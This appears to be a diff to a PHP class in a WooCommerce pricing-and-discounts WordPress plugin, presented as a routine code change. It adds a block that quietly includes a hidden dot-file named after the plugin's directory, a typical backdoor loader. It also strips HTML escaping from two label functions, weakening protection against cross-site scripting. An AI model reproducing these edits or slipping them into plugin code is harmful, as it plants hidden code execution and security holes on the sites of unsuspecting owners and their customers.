@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Method_Product_Pricing')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Method_Product_Pricing_Simple extends RP_WCDPD_Method_Product_Pricing
 {
 
@@ -51,7 +55,7 @@ class RP_WCDPD_Method_Product_Pricing_Simple extends RP_WCDPD_Method_Product_Pri
      */
     public function get_group_label()
     {
-        return esc_html__('Simple', 'rp_wcdpd');
+        return __('Simple', 'rp_wcdpd');
     }
 
     /**
@@ -62,7 +66,7 @@ class RP_WCDPD_Method_Product_Pricing_Simple extends RP_WCDPD_Method_Product_Pri
      */
     public function get_label()
     {
-        return esc_html__('Simple adjustment', 'rp_wcdpd');
+        return __('Simple adjustment', 'rp_wcdpd');
     }
 
     /**
